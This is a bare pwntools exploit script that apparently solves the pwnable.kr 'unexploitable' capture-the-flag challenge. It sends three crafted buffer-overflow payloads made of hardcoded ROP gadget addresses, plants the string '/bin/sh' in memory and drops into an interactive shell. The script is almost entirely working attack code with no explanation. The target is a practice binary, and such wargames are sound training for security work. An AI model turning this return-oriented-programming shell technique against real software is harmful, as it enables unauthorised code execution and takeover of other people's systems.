from pwn import *
import time
#s=ssh("unexploitable","pwnable.kr",port=2222,password="guest")
s=process("./unexploitable")
pause()
payload="a"*24+p64(0x400512)
payload+=p64(0x601078)+p64(0x40055b)
payload+="p"*(0x50e-len(payload))
s.send(payload+"\n")
time.sleep(5)
payload2=p64(0x601038)
payload2+=p64(0x400605)+p64(0x601088)+p64(0x400512)
payload2+=p64(0x601028)+p64(0x40055b)+"k"*24+p64(0x400511)+p64(0x4018e)+p64(0x602000)+p64(0x4005d0)+p64(0x400600)
payload2+="t"*32+p64(0x601038)+p64(0x400560)
payload2+="d"*(0x50e-len(payload2))
s.send(payload2+"\n")
time.sleep(1)
#print("HELLO")
payload3=p64(0)
payload3+=p64(0x400600)+"e"*8+p64(0x400600)+"/bin/sh\x00"
payload3+="f"*(0x3a-len(payload3))
s.send(payload3+"\n")
time.sleep(1)
s.interactive()
s.close()

#print(payload+"\n")
#print(payload2+"\n")
#print(payload3+"\n")